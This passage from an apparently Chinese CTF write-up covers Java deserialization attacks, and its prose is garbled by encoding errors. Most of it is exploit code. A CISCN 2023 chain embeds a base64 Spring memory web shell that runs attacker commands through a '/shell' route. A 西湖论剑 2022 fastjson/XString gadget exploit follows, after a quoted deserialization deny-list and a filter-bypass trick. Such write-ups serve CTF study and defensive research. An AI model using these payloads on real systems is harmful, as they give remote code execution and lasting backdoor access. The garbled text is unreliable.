class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;<br><span class="hljs-keyword">import</span> org.springframework.messaging.support.GenericMessage;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        String s=<span class="hljs-string">&quot;yv66vgAAADQAzQoANQBOCABPCwAqAFAIAFEKAFIAUwoACQBUCABVCgAJAFYHAFcIAFgIAFkIAFoIAFsKAFwAXQoAXABeCgBfAGAHAGEKABEAYggAYwoAEQBkCgARAGUKABEAZggAZwsAKwBoCgBpAGoKAGkAawoAbABtCABuCwBvAHAHAHEHAHILAB4AcwoAdAB1CAB2CgApAHcKAHgAeQoAeAB6BwB8BwB/CAA6BwCABwCBBwCCCgApAIMIAIQKAHsAhQsAhgCHCwCGAIgKACcATgoAHwCJBwCKCgAzAIsHAIwBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAFc2hlbGwBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQANU3RhY2tNYXBUYWJsZQcAVwcAjQcAjgcAYQcAfwcAgQcAggEACkV4Y2VwdGlvbnMHAI8BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAJABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4HAIoBAApTb3VyY2VGaWxlAQANTWVtU2hlbGwuamF2YQwANgA3AQADY21kDACRAJIBAAdvcy5uYW1lBwCTDACUAJIMAJUAlgEAA3dpbgwAlwCYAQAQamF2YS9sYW5nL1N0cmluZwEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJkMAJoAmwwAnACdBwCeDACfAKABABFqYXZhL3V0aWwvU2Nhbm5lcgwANgChAQACXEEMAKIAowwApAClDACmAJYBAAAMAKcAqAcAqQwAqgCrDACsADcHAK0MAK4ArwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAsAwAsQCyAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDACzALQHALUMALYAtwEABmNvbmZpZwwAuAC5BwC6DAC7ALwMAL0AvgcAvwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BABRCdWlsZGVyQ29uZmlndXJhdGlvbgEADElubmVyQ2xhc3NlcwEACE1lbVNoZWxsAQAPamF2YS9sYW5nL0NsYXNzAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDADAAMEBAAYvc2hlbGwMAMIAxAcAxQwAxgDHDADIAMkMAMoAywEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMwANwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL09iamVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAA9wcmludFN0YWNrVHJhY2UAIQAnADUAAAAAAAUAAQA2ADcAAQA4AAAAHQABAAEAAAAFKrcAAbEAAAABADkAAAAGAAEAAAATAAEAOgA7AAIAOAAAASEABQAJAAAAqSsSArkAAwIAxgCgBD4SBLgABToEGQTGABIZBLYABhIHtgAImQAFAz4dmQAfBr0ACVkDEgpTWQQSC1NZBSsSArkAAwIAU6cAHAa9AAlZAxIMU1kEEg1TWQUrEgK5AAMCAFM6BbgADhkFtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEAAAACADkAAAAyAAwAAAAqAAsAKwANACwAFAAtACYALgAoADAAYwAxAHAAMgCAADMAlAA0AJ8ANQCoADcAPAAAAC4ABv0AKAEHAD0fWAcAPv4ALgcAPgcAPwcAQEEHAD3/ABUAAwcAQQcAQgcAQwAAAEQAAAAEAAEARQABAEYARwACADgAAAAZAAAAAwAAAAGxAAAAAQA5AAAABgABAAAAPABEAAAABAABAEgAAQBGAEkAAgA4AAAAGQAAAAQAAAABsQAAAAEAOQAAAAYAAQAAAEEARAAAAAQAAQBIAAgASgA3AAEAOAAAAOoABgAHAAAAf7gAGxIcA7kAHQMAwAAeSyoSH7kAIAIAwAAfTCu2ACESIrYAI00sBLYAJCwrtgAlwAAmThInEigFvQApWQMSKlNZBBIrU7YALDoEBL0ACVkDEi1TuAAuLbkALwIAuQAwAQA6BbsAJ1m3ADE6BisZBRkGGQS2ADKnAAhLKrYANLEAAQAAAHYAeQAzAAIAOQAAAEIAEAAAABcADwAYABsAGQAlABoAKgAbACwAHAAzAB0ASgAeAFcAHwBcACAAYwAhAGwAIgB2ACYAeQAkAHoAJQB+ACcAPAAAAAkAAvcAeQcASwQAAgBMAAAAAgBNAH4AAAASAAIAJgB7AH0ACQCGAHsAwwYJ&quot;</span>;<br>        <span class="hljs-type">byte</span>[] bytes=Base64.getDecoder().decode(s);<br>        <br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <br>        POJONode pojoNode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        HotSwappableTargetSource hotSwappableTargetSource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br>        <br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(hotSwappableTargetSource,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1,<span class="hljs-string">&quot;2&quot;</span>);<br>        <br>        setFieldValue(hotSwappableTargetSource,<span class="hljs-string">&quot;target&quot;</span>,pojoNode);<br>        setFieldValue(hotSwappableTargetSource1,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br>        <br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        <br>        POJONode pojoNode1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        HotSwappableTargetSource hotSwappableTargetSource2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">3</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">4</span>);<br>        <br>        HashMap hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap1.put(hotSwappableTargetSource2,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap1.put(hotSwappableTargetSource3,<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(hotSwappableTargetSource2,<span class="hljs-string">&quot;target&quot;</span>,pojoNode1);<br>        setFieldValue(hotSwappableTargetSource3,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;b&quot;</span>));<br>        <br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap1);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(Base64.getEncoder().encodeToString(decodemsg));<br><span class="hljs-comment">//        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span><br><span class="hljs-comment">//        messagecode.getPayload();</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        ClassPool classPool=ClassPool.getDefault();<br>        CtClass ctClass=classPool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;exec\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®°å¾—URLç¼–ç ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171859812.png" alt="image-20240816171859812"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171950364.png" alt="image-20240816171950364"></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/uuzeray/article/details/138199481?spm=1001.2014.3001.5501">ã€Webã€‘è®°å½•CISCN 2023 è¥¿å—åŠå†³èµ› seacloudsé¢˜ç›®å¤ç°-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136601197">ã€Webã€‘å…³äºJavaååºåˆ—åŒ–é‚£äº›å®ç°æœºåˆ¶çš„æœ´ç´ é€šè¯†-CSDNåšå®¢</a></p><p><a href="https://p4d0rn.gitbook.io/java/ctf/seacloud">CISCN 2023 è¥¿å—èµ›åŒºåŠå†³èµ› (HessianåŸç”ŸJDK+Kryoååºåˆ—åŒ–) | Java (gitbook.io)</a></p><p><a href="https://www.yuque.com/misery333/sz1apr/wa9d50l7yo1p4s9g">CISCN2023è¥¿å—èµ›åŒºåŠå†³èµ› seaclouds (yuque.com)</a></p><h2 id="è¥¿æ¹–è®ºå‰‘-2022-easy-api"><a href="#è¥¿æ¹–è®ºå‰‘-2022-easy-api" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]easy_api"></a>[è¥¿æ¹–è®ºå‰‘ 2022]easy_api</h2><p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œä¸»è¦æ˜¯å¤ä¹ ä¸€ä¸‹fjå§ã€‚</p><p>å…ˆå®¡è®¡ä¸€ä¸‹æºç ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917145855630.png" alt="image-20240917145855630"></p><p>ç®€å•çš„indexè·¯ç”±ï¼Œæ²¡å•¥å¥½çœ‹çš„ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917145919252.png" alt="image-20240917145919252"></p><p>æ‰¾åˆ°javaååºåˆ—åŒ–å…¥å£ï¼Œçœ‹ä¸‹libé‡Œéƒ½æœ‰å•¥ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150027163.png" alt="image-20240917150027163"></p><p>fj1.2.48ï¼Œæ²¡äº‹äº†ï¼Œç›´æ¥æ‰“ã€‚</p><p>è¿™é‡Œæœ‰ä¸ªå°æ’æ›²å°±æ˜¯ç»•åˆ°&#x2F;api&#x2F;testä¸Šï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150543256.png" alt="image-20240917150543256"></p><p>å…¶å®ä¹Ÿå¾ˆç®€å•ï¼ŒåŒæ–œæ å°±ç»•äº†ï¼š<a href="https://blog.csdn.net/z69183787/article/details/84848751">web.xml filter ç»•è¿‡åŒ¹é…è®¿é—®ï¼ˆé’ˆå¯¹jettyï¼‰_jettyæƒé™ç»•è¿‡-CSDNåšå®¢</a></p><p>fastjsonæœ€ç»å…¸çš„éƒ¨åˆ†æ˜¯è‡ªåŠ¨è§¦å‘getteræ¥getPropertiesåŠ è½½å­—èŠ‚ç ï¼Œå¦‚ä½•è§¦å‘getterå¯ä»¥é€šè¿‡JSON.parseè§¦å‘ï¼Œä¹Ÿå¯ä»¥é€šè¿‡toJSONStringè§¦å‘ï¼Œå¾ˆæœ‰æ„æ€çš„æ˜¯JSONè¿™ä¸ªç±»çš„tostringå°±æ˜¯toJSONStringï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150458344.png" alt="image-20240917150458344"></p><p>é¢˜ç›®banäº†<code>BadAttributeValueExpException</code>æ¥è§¦å‘tostringï¼Œä¹Ÿbanäº†JNDIçš„ä¸€äº›æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass desc)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.lang.reflect.Proxy&quot;</span>, <span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="hljs-string">&quot;sun.rmi.server.UnicastRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.LiveRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteRef&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>, <span class="hljs-string">&quot;java.rmi.RemoteObjectInvocationHandler&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.registry.Registry&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨xstringæ¥è§¦å‘ï¼Œå¤åˆ¶ä¹‹å‰çš„éƒ¨åˆ†å³å¯ã€‚</p><p>gadgetï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">readObject-&gt;hashmap.put<br>-&gt;XString.toString<br>-&gt;JSON.toString<br>-&gt;Templates.getProperties<br></code></pre></td></tr></table></figure><p>XStringåé¢ç›´æ¥æ¥ä¸Šæ¶æ„å­—èŠ‚ç æ‰“äº†ã€‚</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(Evil.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Evil&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span 